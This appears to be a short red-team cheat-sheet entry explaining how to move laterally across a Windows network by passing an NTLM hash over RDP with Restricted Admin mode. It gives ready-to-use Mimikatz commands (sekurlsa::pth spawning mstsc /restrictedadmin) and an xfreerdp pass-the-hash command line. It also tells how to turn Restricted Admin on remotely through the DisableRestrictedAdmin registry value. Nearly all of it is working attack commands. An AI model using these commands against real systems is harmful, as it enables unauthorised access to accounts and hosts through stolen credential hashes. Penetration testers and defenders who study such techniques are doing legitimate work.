- If the host we want to lateral move to has `RestrictedAdmin` enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.

- With Mimikatz:
1. We execute pass-the-hash using `mimikatz.exe` and spawn an instance of `mstsc.exe` with the `/restrictedadmin` flag:
```js
privilege::debug
sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
```
2. Then just click `OK` on the RDP dialogue and enjoy an interactive session as the user we impersonated.

- With `xFreeRDP`:
```js
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```

- **NOTE:** If **Restricted Admin** mode is disabled on the remote machine we can connect on the host using another tool/protocol like `psexec` or `winrm` and enable it by creating the following registry key and setting it's value to zero: `HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin`.
